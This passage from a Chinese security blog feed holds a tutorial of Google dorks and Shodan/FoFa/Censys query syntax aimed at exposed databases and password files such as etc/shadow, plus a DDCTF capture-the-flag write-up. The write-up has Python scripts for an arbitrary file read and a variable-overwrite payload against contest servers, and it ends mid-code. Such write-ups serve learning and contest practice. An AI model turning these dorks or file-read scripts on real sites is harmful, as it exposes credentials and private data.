搜索指定的文件类型，如：.bak，.mdb，.inc等。</span><br><span class="line">info:　　查找指定站点的一些基本信息。</span><br><span class="line">inurl:　　搜索我们指定的字符是否存在于URL中。</span><br><span class="line">Link:　　link:thief.one可以返回所有和thief.one做了链接的URL。</span><br><span class="line">site:　　site:thief.one将返回所有和这个站有关的URL。</span><br><span class="line"></span><br><span class="line">- 把google可能忽略的字列如查询范围。</span><br><span class="line"></span><br><span class="line">- 把某个字忽略，例子：新加 -坡。</span><br><span class="line">  ~　　同意词。</span><br><span class="line">  .　　单一的通配符。</span><br><span class="line"></span><br><span class="line">- 通配符，可代表多个字母。</span><br><span class="line">  “”　　精确查询。</span><br></pre></td></tr></table></figure><h4 id="搜索不同国家网站"><a href="#搜索不同国家网站" class="headerlink" title="搜索不同国家网站"></a>搜索不同国家网站</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inurl:tw　　台湾</span><br><span class="line">inurl:jp　　日本</span><br></pre></td></tr></table></figure><h4 id="利用google暴库"><a href="#利用google暴库" class="headerlink" title="利用google暴库"></a>利用google暴库</h4><p>利用goole可以搜索到互联网上可以直接下载到的数据库文件，语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">inurl:editor/db/ </span><br><span class="line">inurl:eWebEditor/db/ </span><br><span class="line">inurl:bbs/data/ </span><br><span class="line">inurl:databackup/ </span><br><span class="line">inurl:blog/data/ </span><br><span class="line">inurl:\boke\data </span><br><span class="line">inurl:bbs/database/ </span><br><span class="line">inurl:conn.asp </span><br><span class="line">inc/conn.asp</span><br><span class="line">Server.mapPath(“.mdb”)</span><br><span class="line">allinurl:bbs data</span><br><span class="line">filetype:mdb inurl:database</span><br><span class="line">filetype:inc conn</span><br><span class="line">inurl:data filetype:mdb</span><br><span class="line">intitle:&quot;index of&quot; data</span><br></pre></td></tr></table></figure><h4 id="利用goole搜索敏感信息"><a href="#利用goole搜索敏感信息" class="headerlink" title="利用goole搜索敏感信息"></a>利用goole搜索敏感信息</h4><p>利用google可以搜索一些网站的敏感信息，语法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">intitle:&quot;index of&quot; etc</span><br><span class="line">intitle:&quot;Index of&quot; .sh_history</span><br><span class="line">intitle:&quot;Index of&quot; .bash_history</span><br><span class="line">intitle:&quot;index of&quot; passwd</span><br><span class="line">intitle:&quot;index of&quot; people.lst</span><br><span class="line">intitle:&quot;index of&quot; pwd.db</span><br><span class="line">intitle:&quot;index of&quot; etc/shadow</span><br><span class="line">intitle:&quot;index of&quot; spwd</span><br><span class="line">intitle:&quot;index of&quot; master.passwd</span><br><span class="line">intitle:&quot;index of&quot; htpasswd</span><br><span class="line">inurl:service.pwd</span><br></pre></td></tr></table></figure><h4 id="利用google搜索C段服务器信息"><a href="#利用google搜索C段服务器信息" class="headerlink" title="利用google搜索C段服务器信息"></a>利用google搜索C段服务器信息</h4><p>此技巧来自<a href="http://wolvez.club/" target="_blank" rel="noopener">lostwolf</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:218.87.21.*</span><br></pre></td></tr></table></figure><p>可通过google可获取218.87.21.0/24网络的服务信息。</p><h3 id="shodan搜索引擎"><a href="#shodan搜索引擎" class="headerlink" title="shodan搜索引擎"></a>shodan搜索引擎</h3><p>shodan网络搜索引擎偏向网络设备以及服务器的搜索，具体内容可上网查阅，这里给出它的高级搜索语法。<br>地址：<a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></p><h4 id="搜索语法"><a href="#搜索语法" class="headerlink" title="搜索语法"></a>搜索语法</h4><ul><li>hostname：　　搜索指定的主机或域名，例如 hostname:”google”</li><li>port：　　搜索指定的端口或服务，例如 port:”21”</li><li>country：　　搜索指定的国家，例如 country:”CN”</li><li>city：　　搜索指定的城市，例如 city:”Hefei”</li><li>org：　　搜索指定的组织或公司，例如 org:”google”</li><li>isp：　　搜索指定的ISP供应商，例如 isp:”China Telecom”</li><li>product：　　搜索指定的操作系统/软件/平台，例如 product:”Apache httpd”</li><li>version：　　搜索指定的软件版本，例如 version:”1.6.2”</li><li>geo：　　搜索指定的地理位置，例如 geo:”31.8639, 117.2808”</li><li>before/after：　　搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15”</li><li>net：　　搜索指定的IP地址或子网，例如 net:”210.45.240.0/24”</li></ul><p>以上内容参考：<a href="http://xiaix.me/shodan-xin-shou-ru-keng-zhi-nan/" target="_blank" rel="noopener">http://xiaix.me/shodan-xin-shou-ru-keng-zhi-nan/</a></p><h3 id="censys搜索引擎"><a href="#censys搜索引擎" class="headerlink" title="censys搜索引擎"></a>censys搜索引擎</h3><p>censys搜索引擎功能与shodan类似，以下几个文档信息。<br>地址：<a href="https://www.censys.io/" target="_blank" rel="noopener">https://www.censys.io/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://www.censys.io/certificates/help 帮助文档</span><br><span class="line">https://www.censys.io/ipv4?q=  ip查询</span><br><span class="line">https://www.censys.io/domain?q=  域名查询</span><br><span class="line">https://www.censys.io/certificates?q= 证书查询</span><br></pre></td></tr></table></figure><h4 id="搜索语法-1"><a href="#搜索语法-1" class="headerlink" title="搜索语法"></a>搜索语法</h4><p>默认情况下censys支持全文检索。</p><ul><li>23.0.0.0/8 or 8.8.8.0/24　　可以使用and or not</li><li>80.http.get.status_code: 200　　指定状态</li><li>80.http.get.status_code:[200 TO 300]　　200-300之间的状态码</li><li>location.country_code: DE　　国家</li><li>protocols: (“23/telnet” or “21/ftp”)　　协议</li><li>tags: scada　　标签</li><li>80.http.get.headers.server：nginx　　服务器类型版本</li><li>autonomous_system.description: University　　系统描述</li><li>正则</li></ul><h3 id="钟馗之眼"><a href="#钟馗之眼" class="headerlink" title="钟馗之眼"></a>钟馗之眼</h3><p>钟馗之眼搜索引擎偏向web应用层面的搜索。<br>地址：<a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a></p><h4 id="搜索语法-2"><a href="#搜索语法-2" class="headerlink" title="搜索语法"></a>搜索语法</h4><ul><li>app:nginx　　组件名</li><li>ver:1.0　　版本</li><li>os:windows　　操作系统</li><li>country:”China”　　国家</li><li>city:”hangzhou”　　城市</li><li>port:80　　端口</li><li>hostname:google　　主机名</li><li>site:thief.one　　网站域名</li><li>desc:nmask　　描述</li><li>keywords:nmask’blog　　关键词</li><li>service:ftp　　服务类型</li><li>ip:8.8.8.8　　ip地址</li><li>cidr:8.8.8.8/24　　ip地址段</li></ul><h3 id="FoFa搜索引擎"><a href="#FoFa搜索引擎" class="headerlink" title="FoFa搜索引擎"></a>FoFa搜索引擎</h3><p>FoFa搜索引擎偏向资产搜索。<br>地址：<a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so</a></p><h4 id="搜索语法-3"><a href="#搜索语法-3" class="headerlink" title="搜索语法"></a>搜索语法</h4><ul><li>title=”abc” 从标题中搜索abc。例：标题中有北京的网站。</li><li>header=”abc” 从http头中搜索abc。例：jboss服务器。</li><li>body=”abc” 从html正文中搜索abc。例：正文包含Hacked by。</li><li>domain=”qq.com” 搜索根域名带有qq.com的网站。例： 根域名是qq.com的网站。</li><li>host=”.gov.cn” 从url中搜索.gov.cn,注意搜索要用host作为名称。</li><li>port=”443” 查找对应443端口的资产。例： 查找对应443端口的资产。</li><li>ip=”1.1.1.1” 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。</li><li>protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)。例： 查询https协议资产。</li><li>city=”Beijing” 搜索指定城市的资产。例： 搜索指定城市的资产。</li><li>region=”Zhejiang” 搜索指定行政区的资产。例： 搜索指定行政区的资产。</li><li>country=”CN” 搜索指定国家(编码)的资产。例： 搜索指定国家(编码)的资产。</li><li>cert=”google.com” 搜索证书(https或者imaps等)中带有google.com的资产。</li></ul><p>高级搜索：</p><ul><li>title=”powered by” &amp;&amp; title!=discuz</li><li>title!=”powered by” &amp;&amp; body=discuz</li><li>( body=”content=\”WordPress” || (header=”X-Pingback” &amp;&amp; header=”/xmlrpc.php” &amp;&amp; body=”/wp-includes/“) ) &amp;&amp; host=”gov.cn”</li></ul><h3 id="Dnsdb搜索引擎"><a href="#Dnsdb搜索引擎" class="headerlink" title="Dnsdb搜索引擎"></a>Dnsdb搜索引擎</h3><p>dnsdb搜索引擎是一款针对dbs解析的查询平台。<br>地址：<a href="https://www.dnsdb.io/" target="_blank" rel="noopener">https://www.dnsdb.io/</a></p><h4 id="搜索语法-4"><a href="#搜索语法-4" class="headerlink" title="搜索语法"></a>搜索语法</h4><p>DnsDB查询语法结构为条件1 条件2 条件3 …., 每个条件以空格间隔, DnsDB 会把满足所有查询条件的结果返回给用户.</p><h5 id="域名查询条件"><a href="#域名查询条件" class="headerlink" title="域名查询条件"></a>域名查询条件</h5><p>域名查询是指查询顶级私有域名所有的DNS记录, 查询语法为domain:.<br>例如查询google.com 的所有DNS记录: domain:google.com.<br>域名查询可以省略domain:.</p><h5 id="主机查询条件"><a href="#主机查询条件" class="headerlink" title="主机查询条件"></a>主机查询条件</h5><p>查询语法:host:<br>例如查询主机地址为mp3.example.com的DNS记录: host:map3.example.com<br>主机查询条件与域名查询查询条件的区别在于, 主机查询匹配的是DNS记录的Host值</p><h5 id="按DNS记录类型查询"><a href="#按DNS记录类型查询" class="headerlink" title="按DNS记录类型查询"></a>按DNS记录类型查询</h5><p>查询语法: type:.<br>例如只查询A记录: type:a<br>使用条件:必须存在domain:或者host:条件,才可以使用type:查询语法</p><h5 id="按IP限制"><a href="#按IP限制" class="headerlink" title="按IP限制"></a>按IP限制</h5><p>查询语法: ip:<br>查询指定IP: ip:8.8.8.8, 该查询与直接输入8.8.8.8进行查询等效<br>查询指定IP范围: ip:8.8.8.8-8.8.255.255<br>CIDR: ip:8.8.0.0/24<br>IP最大范围限制65536个</p><h5 id="条件组合查询的例子"><a href="#条件组合查询的例子" class="headerlink" title="条件组合查询的例子"></a>条件组合查询的例子</h5><p>查询google.com的所有A记录: google.com type:a</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本篇要介绍的搜索引擎包括：Shodan，censys，钟馗之眼，Google，FoFa，Dnsdb等。介绍的内容主要是这几款搜索引擎的一些高级语法，掌握高级语法会让搜索结果更准确。&lt;/p&gt;
&lt;h3 id=&quot;Google搜索引擎&quot;&gt;&lt;a href=&quot;#Google搜索引擎&quot; 
      
    
    </summary>
    
      <category term="渗透测试" scheme="https:///login546.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="搜索引擎利用" scheme="https:///login546.github.io/tags/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>ss/ssr一键搭建及开启bbr加速</title>
    <link href="https:///login546.github.io/2019/05/14/ss-ssr%E4%B8%80%E9%94%AE%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%BC%80%E5%90%AFbbr%E5%8A%A0%E9%80%9F/"/>
    <id>https:///login546.github.io/2019/05/14/ss-ssr一键搭建及开启bbr加速/</id>
    <published>2019-05-14T18:57:26.000Z</published>
    <updated>2021-01-22T08:48:08.994Z</updated>
    
    <content type="html"><![CDATA[<h3 id="remove"><a href="#remove" class="headerlink" title="remove"></a>remove</h3><p>No reason.</p><p>Thank you for coming to my blog.</p><p>I hope you see other articles.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"Hello World!"</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;remove&quot;&gt;&lt;a href=&quot;#remove&quot; class=&quot;headerlink&quot; title=&quot;remove&quot;&gt;&lt;/a&gt;remove&lt;/h3&gt;&lt;p&gt;No reason.&lt;/p&gt;
&lt;p&gt;Thank you for coming to my blog.&lt;/p&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2019-DDCTF-writeup</title>
    <link href="https:///login546.github.io/2019/04/19/2019-DDCTF-writeup/"/>
    <id>https:///login546.github.io/2019/04/19/2019-DDCTF-writeup/</id>
    <published>2019-04-19T14:00:12.000Z</published>
    <updated>2021-01-22T08:48:08.990Z</updated>
    
    <content type="html"><![CDATA[<p>这次比赛一共解出3题Web、1题Misc的流量分析和1个签到，总共拿到561分。<br>排名目前在224名。因为主办方现在还在ban掉作弊选手，所以还有上升空间（手动滑稽～）<br><img src="https://user-images.githubusercontent.com/38073810/56410132-9da24600-62ae-11e9-8ee1-ed886764039f.png" alt="dd1"></p><h2 id="Web解题思路"><a href="#Web解题思路" class="headerlink" title="Web解题思路"></a>Web解题思路</h2><h3 id="一、滴～"><a href="#一、滴～" class="headerlink" title="一、滴～"></a>一、滴～</h3><p><img src="https://user-images.githubusercontent.com/38073810/56410361-6da77280-62af-11e9-8ed8-e1207357f4b1.png" alt="dd2"><br>靶机：<a href="http://117.51.150.246" target="_blank" rel="noopener">http://117.51.150.246</a><br>知识点：任意文件读取、加解密、脑洞、extract变量覆盖</p><h4 id="1、打开靶机"><a href="#1、打开靶机" class="headerlink" title="1、打开靶机"></a>1、打开靶机</h4><p><img src="https://user-images.githubusercontent.com/38073810/56410583-266db180-62b0-11e9-95a0-dea35b9cf65c.png" alt="image"></p><h4 id="2、在URL中发现可能为任意文件读取，但是文件名被加密，然后我们先去解密"><a href="#2、在URL中发现可能为任意文件读取，但是文件名被加密，然后我们先去解密" class="headerlink" title="2、在URL中发现可能为任意文件读取，但是文件名被加密，然后我们先去解密"></a>2、在URL中发现可能为任意文件读取，但是文件名被加密，然后我们先去解密</h4><p><img src="https://user-images.githubusercontent.com/38073810/56410957-a47e8800-62b1-11e9-9062-a6f42be9f51d.png" alt="image"><br>经过Base64解密–&gt;Base64解密–&gt;Base16解密 得到原目录名flag.jpg</p><h4 id="3、构造index-php"><a href="#3、构造index-php" class="headerlink" title="3、构造index.php"></a>3、构造index.php</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">u = <span class="string">'index.php'</span></span><br><span class="line"></span><br><span class="line">jpg = base64.b64encode(base64.b64encode(<span class="string">""</span>.join(<span class="string">"&#123;:02x&#125;"</span>.format(ord(c)) <span class="keyword">for</span> c <span class="keyword">in</span> u).encode(<span class="string">'utf-8'</span>))).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://117.51.150.246/index.php'</span>, params=&#123;<span class="string">'jpg'</span>: jpg&#125;)</span><br><span class="line"></span><br><span class="line">print(r.url)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>运行后发现被base64加密过的数据,解密后得到index.php源代码<br><img src="https://user-images.githubusercontent.com/38073810/56411544-af3a1c80-62b3-11e9-9ffb-753e66bc2444.png" alt="image"><br><img src="https://user-images.githubusercontent.com/38073810/56411746-5ae36c80-62b4-11e9-9f72-bf47be8a1ef9.png" alt="image"><br>审计发现config会被转换成！,然后构造尝试多次无果。所以暂时放弃了。<br>后来继续又看了遍代码，在注释里面发现一个博客，浏览后发现此篇文章并没有什么用，但是在推荐里面发现一篇有用的文章<br><img src="https://user-images.githubusercontent.com/38073810/56411959-29b76c00-62b5-11e9-9729-ca87df0be002.png" alt="image"><br><img src="https://user-images.githubusercontent.com/38073810/56413773-27581080-62bb-11e9-926f-9dcdcb28d994.png" alt="image"></p><h4 id="4、构造practice-txt-swp"><a href="#4、构造practice-txt-swp" class="headerlink" title="4、构造practice.txt.swp"></a>4、构造practice.txt.swp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"> u = <span class="string">'practice.txt.swp'</span></span><br><span class="line"></span><br><span class="line"> jpg = base64.b64encode(base64.b64encode(<span class="string">""</span>.join(<span class="string">"&#123;:02x&#125;"</span>.format(ord(c)) <span class="keyword">for</span> c <span class="keyword">in</span> u).encode(<span class="string">'utf-8'</span>))).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"> r = requests.get(<span class="string">'http://117.51.150.246/index.php'</span>, params=&#123;<span class="string">'jpg'</span>: jpg&#125;)</span><br><span class="line"></span><br><span class="line"> print(r.url)</span><br><span class="line"> print(r.text)</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/38073810/56412137-caa62700-62b5-11e9-8cce-c33bdec84bb6.png" alt="image"><br> 运行后得到Base64加密过的数据，解密后得到<br><img src="https://user-images.githubusercontent.com/38073810/56412320-4acc8c80-62b6-11e9-89a9-5fa3f4be196e.png" alt="image"></p><h4 id="5、构造f1ag-ddctf-php"><a href="#5、构造f1ag-ddctf-php" class="headerlink" title="5、构造f1ag!ddctf.php"></a>5、构造f1ag!ddctf.php</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">u = <span class="string">'f1agconfigddctf.php'</span></span><br><span class="line"></span><br><span class="line">jpg = base64.b64encode(base64.b64encode(<span class="string">""</span>.join(<span class="string">"&#123;:02x&#125;"</span>.format(ord(c)) <span class="keyword">for</span> c <span class="keyword">in</span> u).encode(<span class="string">'utf-8'</span>))).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://117.51.150.246/index.php'</span>, params=&#123;<span class="string">'jpg'</span>: jpg&#125;)</span><br><span class="line"></span><br><span class="line">print(r.url)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>之前我们在index.php中可以通过审计代码得到config可以被替换为！所以我们在构造f1ag!ddctf.php时，注意把！替换为config<br>得到Base64加密过的数据，解密后得到<br><img src="https://user-images.githubusercontent.com/38073810/56412587-55d3ec80-62b7-11e9-9d02-3c714d4df416.png" alt="image"><br>审计代码后发现可以利用extract变量覆盖<br>资料：<a href="http://www.w3school.com.cn/php/func_array_extract.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_array_extract.asp</a><br>我们构造payload:<a href="http://117.51.150.246/f1ag!ddctf.php?uid=&amp;k=1" target="_blank" rel="noopener">http://117.51.150.246/f1ag!ddctf.php?uid=&amp;k=1</a>  最终得到flag<br><img src="https://user-images.githubusercontent.com/38073810/56413294-99c7f100-62b9-11e9-82f9-77c9d8e706ba.png" alt="image"></p><h3 id="二、WEB签到题"><a href="#二、WEB签到题" class="headerlink" title="二、WEB签到题"></a>二、WEB签到题</h3><p><img src="https://user-images.githubusercontent.com/38073810/56414702-0b09a300-62be-11e9-8592-215823d406fe.png" alt="image"><br>靶机:<a href="http://117.51.158.44/index.php" target="_blank" rel="noopener">http://117.51.158.44/index.php</a><br>知识点：php代码审计、文本格式化、php反序列化</p><h4 id="1、查看js-didictf-username"><a href="#1、查看js-didictf-username" class="headerlink" title="1、查看js, didictf_username"></a>1、查看js, didictf_username</h4><p><img src="https://user-images.githubusercontent.com/38073810/56415105-45277480-62bf-11e9-8503-938ce3ca7efb.png" alt="image"></p><h4 id="2、Burpsuite抓包，修改didictf-username为admin，得到目录"><a href="#2、Burpsuite抓包，修改didictf-username为admin，得到目录" class="headerlink" title="2、Burpsuite抓包，修改didictf_username为admin，得到目录"></a>2、Burpsuite抓包，修改didictf_username为admin，得到目录</h4><p><img src="https://user-images.githubusercontent.com/38073810/56414665-e1e91280-62bd-11e9-923f-85c423939e56.png" alt="6DD11375-1C41-494F-82F1-A4514A657B38"></p><h4 id="3、访问app-fL2XID2i0Cdh-php-得到源码"><a href="#3、访问app-fL2XID2i0Cdh-php-得到源码" class="headerlink" title="3、访问app/fL2XID2i0Cdh.php,得到源码"></a>3、访问app/fL2XID2i0Cdh.php,得到源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">url:app/Application.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">        <span class="keyword">echo</span> $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url:app/Session.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain= <span class="string">''</span>;</span><br><span class="line">    <span 